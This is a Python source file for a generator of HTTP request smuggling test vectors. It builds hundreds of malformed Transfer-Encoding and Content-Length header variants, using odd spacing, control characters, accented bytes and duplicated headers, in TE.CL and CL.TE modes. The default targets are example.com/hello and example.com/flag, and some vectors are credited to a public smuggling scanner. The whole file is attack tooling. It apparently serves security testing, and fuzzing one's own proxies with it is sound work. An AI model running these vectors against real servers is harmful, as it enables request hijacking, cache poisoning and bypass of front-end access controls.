import request

class tv_generator():
    def __init__(self, clean_url="example.com/hello",smuggle_url="example.com/flag"):
        self.clean_url = clean_url
        self.smuggle_url = smuggle_url
        self.test_vectors = {}

    def build_request(self,test_vector, tecl=True):
        '''
        Returns a HRS Request with the specified test vector.
        If tecl is True the smuggled request is hidden in the body specified by the Transfer-Encoding header
        Otherwise the smuggled request is hidden in the body specified by the Content-Length header
        '''
        #return test_vector.encode("hex")
        return request.request(clean_url=self.clean_url, smuggle_url=self.smuggle_url, vector=test_vector, tecl=tecl)

    def generate_vectors(self):
        '''
        Returns a dictionary of all test vectors in the form of (vector_id, modified header).
        '''
        for tecl in (True,False):
            self._generate_basics(tecl)
            self._generate_cl_vectors(tecl)
            self._generate_spaces(tecl)
            self._generate_doubles(tecl)
        self.test_vectors["None"] = request.request(self.smuggle_url)
        return self.test_vectors

    def _generate_cl_vectors(self,tecl):
        tecl_str = "TE.CL" if tecl else "CL.TE"

        self.test_vectors["CL-nameprefix1-" + tecl_str] = self.build_request(" Content-Length: __CL__", tecl)
        self.test_vectors["CL-tabprefix1-" + tecl_str] = self.build_request("Content-Length:\t__CL__", tecl)
        self.test_vectors["CL-tabprefix2-" + tecl_str] = self.build_request("Content-Length\t:\t__CL__", tecl)
        self.test_vectors["CL-spacejoin1-" + tecl_str] = self.build_request("Content Length: __CL__", tecl)
        self.test_vectors["CL-underjoin1-" + tecl_str] = self.build_request("Content_Length: __CL__", tecl)
        self.test_vectors["CL-smashed-" + tecl_str] = self.build_request("Content Length:__CL__", tecl)
        self.test_vectors["CL-space1-" + tecl_str] = self.build_request("Content-Length : __CL__", tecl)
        self.test_vectors["CL-valueprefix1-" + tecl_str] = self.build_request("Content-Length:  __CL__", tecl)
        self.test_vectors["CL-vertprefix1-" + tecl_str] = self.build_request("Content-Length:\u000B__CL__", tecl)

        self.test_vectors["CL-double-colon-" + tecl_str] = self.build_request("Content-Length:: __CL__", tecl)

        self.test_vectors["CL-contentEnc-"+ tecl_str] = self.build_request("Content-Encoding: __CL__", tecl)
        self.test_vectors["CL-linewrapped1-" + tecl_str] = self.build_request("Content-Length:\n __CL__", tecl)
        self.test_vectors["CL-quoted-" + tecl_str] = self.build_request("Content-Length: \"__CL__\"", tecl)
        self.test_vectors["CL-aposed-" + tecl_str] = self.build_request("Content-Length: '__CL__'", tecl)

        self.test_vectors["CL-0dspam-" + tecl_str] = self.build_request("Content\r-Length: __CL__", tecl)

        self.test_vectors["CL-accentTE-" + tecl_str] = self.build_request("Cont\x82nt-Length: __CL__", tecl)
        self.test_vectors["CL-x-rout-" + tecl_str] = self.build_request("X:X\rContent-Length: __CL__", tecl)
        self.test_vectors["CL-x-nout-" + tecl_str] = self.build_request("X:X\nContent-Length: __CL__", tecl)


    def _generate_basics(self,tecl):
        tecl_str = "TE.CL" if tecl else "CL.TE"

        self.test_vectors["TE-basic-" + tecl_str] = self.build_request("Transfer-Encoding: chunked", tecl)
        self.test_vectors["TE-chunkprefix-" + tecl_str] = self.build_request("Transfer-Encoding: notchunked", tecl)
        self.test_vectors["TE-chunksuffix-" + tecl_str] = self.build_request("Transfer-Encoding: chunkednot", tecl)
        self.test_vectors["TE-double-colon-" + tecl_str] = self.build_request("Transfer-Encoding:: chunked", tecl)
        self.test_vectors["TE-doubleheader-first-" + tecl_str] = self.build_request("Transfer-Encoding: chunked\r\nTransfer-Encoding: identity", tecl)
        self.test_vectors["TE-doubleheader-last-" + tecl_str] = self.build_request("Transfer-Encoding: identity\r\nTransfer-Encoding: chunked", tecl)

        #####SmugglerPy https://github.com/defparam/smuggler/tree/master ######
        self.test_vectors["TE-nameprefix1-" + tecl_str] = self.build_request(" Transfer-Encoding: chunked", tecl)
        self.test_vectors["TE-tabprefix1-" + tecl_str] = self.build_request("Transfer-Encoding:\tchunked", tecl)
        self.test_vectors["TE-tabprefix2-" + tecl_str] = self.build_request("Transfer-Encoding\t:\tchunked", tecl)
        self.test_vectors["TE-spacejoin1-" + tecl_str] = self.build_request("Transfer Encoding: chunked", tecl)
        self.test_vectors["TE-underjoin1-" + tecl_str] = self.build_request("Transfer_Encoding: chunked", tecl)
        self.test_vectors["TE-smashed-" + tecl_str] = self.build_request("Transfer Encoding:chunked", tecl)
        self.test_vectors["TE-space1-" + tecl_str] = self.build_request("Transfer-Encoding : chunked", tecl)
        self.test_vectors["TE-valueprefix1-" + tecl_str] = self.build_request("Transfer-Encoding:  chunked", tecl)
        self.test_vectors["TE-vertprefix1-" + tecl_str] = self.build_request("Transfer-Encoding:\u000Bchunked", tecl)
        self.test_vectors["TE-commaCow-" + tecl_str] = self.build_request("Transfer-Encoding: chunked, cow", tecl)
        self.test_vectors["TE-cowComma-" + tecl_str] = self.build_request("Transfer-Encoding: cow, chunked", tecl)
        self.test_vectors["TE-contentEnc-"+ tecl_str] = self.build_request("Content-Encoding: chunked", tecl)
        self.test_vectors["TE-linewrapped1-" + tecl_str] = self.build_request("Transfer-Encoding:\n chunked", tecl)
        self.test_vectors["TE-quoted-" + tecl_str] = self.build_request("Transfer-Encoding: \"chunked\"", tecl)
        self.test_vectors["TE-aposed-" + tecl_str] = self.build_request("Transfer-Encoding: 'chunked'", tecl)
        self.test_vectors["TE-lazygrep-" + tecl_str] = self.build_request("Transfer-Encoding: chunk", tecl)
        self.test_vectors["TE-sarcasm-" + tecl_str] = self.build_request("TrAnSFer-EnCODinG: cHuNkeD", tecl)
        self.test_vectors["TE-yelling-" + tecl_str] = self.build_request("TRANSFER-ENCODING: CHUNKED", tecl)
        self.test_vectors["TE-0dsuffix-" + tecl_str] = self.build_request("Transfer-Encoding: chunked\r", tecl)
        self.test_vectors["TE-tabsuffix-" + tecl_str] = self.build_request("Transfer-Encoding: chunked\t", tecl)
        self.test_vectors["TE-revdualchunk-" + tecl_str] = self.build_request("Transfer-Encoding: cow\r\nTransfer-Encoding: chunked", tecl)
        self.test_vectors["TE-0dspam-" + tecl_str] = self.build_request("Transfer\r-Encoding: chunked", tecl)
        self.test_vectors["TE-nested-" + tecl_str] = self.build_request("Transfer-Encoding: cow chunked bar", tecl)
        self.test_vectors["TE-spaceFF-" + tecl_str] = self.build_request("Transfer-Encoding:\xFFchunked", tecl)
        self.test_vectors["TE-accentCH-" + tecl_str] = self.build_request("Transfer-Encoding: ch\x96nked", tecl)
        self.test_vectors["TE-accentTE-" + tecl_str] = self.build_request("Transf\x82r-Encoding: chunked", tecl)
        self.test_vectors["TE-x-rout-" + tecl_str] = self.build_request("X:X\rTransfer-Encoding: chunked", tecl)
        self.test_vectors["TE-x-nout-" + tecl_str] = self.build_request("X:X\nTransfer-Encoding: chunked", tecl)

    def _generate_spaces(self,tecl):
        tecl_str = "TE.CL" if tecl else "CL.TE"
        
        #####SmugglerPy https://github.com/defparam/smuggler/tree/master ######
        for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:
            self.test_vectors["TE-midspace-%02x-"%i + tecl_str] = self.build_request("Transfer-Encoding:%cchunked"%(i), tecl)
            self.test_vectors["TE-postspace-%02x-"%i+ tecl_str] = self.build_request("Transfer-Encoding%c: chunked"%(i), tecl)
            self.test_vectors["TE-prespace-%02x-"%i + tecl_str] = self.build_request("%cTransfer-Encoding: chunked"%(i), tecl)
            self.test_vectors["TE-endspace-%02x-"%i + tecl_str] = self.build_request("Transfer-Encoding: chunked%c"%(i), tecl)
            self.test_vectors["TE-xprespace-%02x-"%i + tecl_str] = self.build_request("X: X%cTransfer-Encoding: chunked"%(i), tecl)
            self.test_vectors["TE-endspacex-%02x-"%i + tecl_str] = self.build_request("Transfer-Encoding: chunked%cX: X"%(i), tecl)
            self.test_vectors["TE-rxprespace-%02x-"%i + tecl_str] = self.build_request("X: X\r%cTransfer-Encoding: chunked"%(i), tecl)
            self.test_vectors["TE-xnprespace-%02x-"%i + tecl_str] = self.build_request("X: X%c\nTransfer-Encoding: chunked"%(i), tecl)
            self.test_vectors["TE-endspacerx-%02x-"%i + tecl_str] = self.build_request("Transfer-Encoding: chunked\r%cX: X"%(i), tecl)
            self.test_vectors["TE-endspacexn-%02x-"%i + tecl_str] = self.build_request("Transfer-Encoding: chunked%c\nX: X"%(i), tecl)

            self.test_vectors["CL-midspace-%02x-"%i + tecl_str] = self.build_request("Content-Length:%c__CL__"%(i), tecl)
            self.test_vectors["CL-postspace-%02x-"%i+ tecl_str] = self.build_request("Content-Length%c: __CL__"%(i), tecl)
            self.test_vectors["CL-prespace-%02x-"%i + tecl_str] = self.build_request("%cContent-Length: __CL__"%(i), tecl)
            self.test_vectors["CL-endspace-%02x-"%i + tecl_str] = self.build_request("Content-Length: __CL__%c"%(i), tecl)
            self.test_vectors["CL-xprespace-%02x-"%i + tecl_str] = self.build_request("X: X%cContent-Length: __CL__"%(i), tecl)
            self.test_vectors["CL-endspacex-%02x-"%i + tecl_str] = self.build_request("Content-Length: __CL__%cX: X"%(i), tecl)
            self.test_vectors["CL-rxprespace-%02x-"%i + tecl_str] = self.build_request("X: X\r%cContent-Length: __CL__"%(i), tecl)
            self.test_vectors["CL-xnprespace-%02x-"%i + tecl_str] = self.build_request("X: X%c\nContent-Length: __CL__"%(i), tecl)
            self.test_vectors["CL-endspacerx-%02x-"%i + tecl_str] = self.build_request("Content-Length: __CL__\r%cX: X"%(i), tecl)
            self.test_vectors["CL-endspacexn-%02x-"%i + tecl_str] = self.build_request("Content-Length: __CL__%c\nX: X"%(i), tecl)
    
    def _generate_doubles(self,tecl):
        tecl_str = "TE.CL" if tecl else "CL.TE"
        #####SmugglerPy https://github.com/defparam/smuggler/tree/master ######
        for i in range(0x1,0x21):
            self.test_vectors["TE-%02x-%02x-XX-XX-"%(i,i) + tecl_str] = self.build_request("%cTransfer-Encoding%c: chunked"%(i,i), tecl)
            self.test_vectors["TE-%02x-XX-%02x-XX-"%(i,i) + tecl_str] = self.build_request("%cTransfer-Encoding:%cchunked"%(i,i), tecl)
            self.test_vectors["TE-%02x-XX-XX-%02x-"%(i,i) + tecl_str] = self.build_request("%cTransfer-Encoding: chunked%c"%(i,i), tecl)
            self.test_vectors["TE-XX-%02x-%02x-XX-"%(i,i) + tecl_str] = self.build_request("Transfer-Encoding%c:%cchunked"%(i,i), tecl)
            self.test_vectors["TE-XX-%02x-XX-%02x-"%(i,i) + tecl_str] = self.build_request("Transfer-Encoding%c: chunked%c"%(i,i), tecl)
            self.test_vectors["TE-XX-XX-%02x-%02x-"%(i,i) + tecl_str] = self.build_request("Transfer-Encoding:%cchunked%c"%(i,i), tecl)

            self.test_vectors["CL-%02x-%02x-XX-XX-"%(i,i) + tecl_str] = self.build_request("%cContent-Length%c: __CL__"%(i,i), tecl)
            self.test_vectors["CL-%02x-XX-%02x-XX-"%(i,i) + tecl_str] = self.build_request("%cContent-Length:%c__CL__"%(i,i), tecl)
            self.test_vectors["CL-%02x-XX-XX-%02x-"%(i,i) + tecl_str] = self.build_request("%cContent-Length: __CL__%c"%(i,i), tecl)
            self.test_vectors["CL-XX-%02x-%02x-XX-"%(i,i) + tecl_str] = self.build_request("Content-Length%c:%c__CL__"%(i,i), tecl)
            self.test_vectors["CL-XX-%02x-XX-%02x-"%(i,i) + tecl_str] = self.build_request("Content-Length%c: __CL__%c"%(i,i), tecl)
            self.test_vectors["CL-XX-XX-%02x-%02x-"%(i,i) + tecl_str] = self.build_request("Content-Length:%c__CL__%c"%(i,i), tecl)
        
        #0x7F to 0x09F Control Characters, 0x100 Latin-A Supplement
        #####SmugglerPy https://github.com/defparam/smuggler/tree/master ######
        for i in range(0x7F,0x100):
            self.test_vectors["TE-%02x-%02x-XX-XX-"%(i,i) + tecl_str] = self.build_request("%cTransfer-Encoding%c: chunked"%(i,i), tecl)
            self.test_vectors["TE-%02x-XX-%02x-XX-"%(i,i) + tecl_str] = self.build_request("%cTransfer-Encoding:%cchunked"%(i,i), tecl)
            self.test_vectors["TE-%02x-XX-XX-%02x-"%(i,i) + tecl_str] = self.build_request("%cTransfer-Encoding: chunked%c"%(i,i), tecl)
            self.test_vectors["TE-XX-%02x-%02x-XX-"%(i,i) + tecl_str] = self.build_request("Transfer-Encoding%c:%cchunked"%(i,i), tecl)
            self.test_vectors["TE-XX-%02x-XX-%02x-"%(i,i) + tecl_str] = self.build_request("Transfer-Encoding%c: chunked%c"%(i,i), tecl)
            self.test_vectors["TE-XX-XX-%02x-%02x-"%(i,i) + tecl_str] = self.build_request("Transfer-Encoding:%cchunked%c"%(i,i), tecl)

            self.test_vectors["CL-%02x-%02x-XX-XX-"%(i,i) + tecl_str] = self.build_request("%cContent-Length%c: __CL__"%(i,i), tecl)
            self.test_vectors["CL-%02x-XX-%02x-XX-"%(i,i) + tecl_str] = self.build_request("%cContent-Length:%c__CL__"%(i,i), tecl)
            self.test_vectors["CL-%02x-XX-XX-%02x-"%(i,i) + tecl_str] = self.build_request("%cContent-Length: __CL__%c"%(i,i), tecl)
            self.test_vectors["CL-XX-%02x-%02x-XX-"%(i,i) + tecl_str] = self.build_request("Content-Length%c:%c__CL__"%(i,i), tecl)
            self.test_vectors["CL-XX-%02x-XX-%02x-"%(i,i) + tecl_str] = self.build_request("Content-Length%c: __CL__%c"%(i,i), tecl)
            self.test_vectors["CL-XX-XX-%02x-%02x-"%(i,i) + tecl_str] = self.build_request("Content-Length:%c__CL__%c"%(i,i), tecl)
